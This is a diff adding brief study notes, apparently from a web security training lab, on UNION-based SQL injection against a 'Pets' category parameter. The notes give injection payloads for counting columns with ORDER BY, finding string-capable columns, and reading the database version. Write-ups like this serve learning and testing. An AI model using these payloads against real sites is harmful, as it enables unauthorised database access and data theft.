@@ -1,0 +1,17 @@
+Analysis:
+1. Find the no of col
+Pets'ORDER BY 1--%20%
+or
+Pets'ORDER BY 1#
+Need a space after -- to comment -> MySql
+no error
+
+Pets'ORDER BY 3-- 
+ERROR -> 3 - 1 = 2 cols
+
+2. Find the col that contain text
+Pets'UNION SELECT 'A', 'a'-- 
+Both can handle type of string data
+
+3. Get the DB types
+Pets'UNION SELECT NULL, @@version--%20
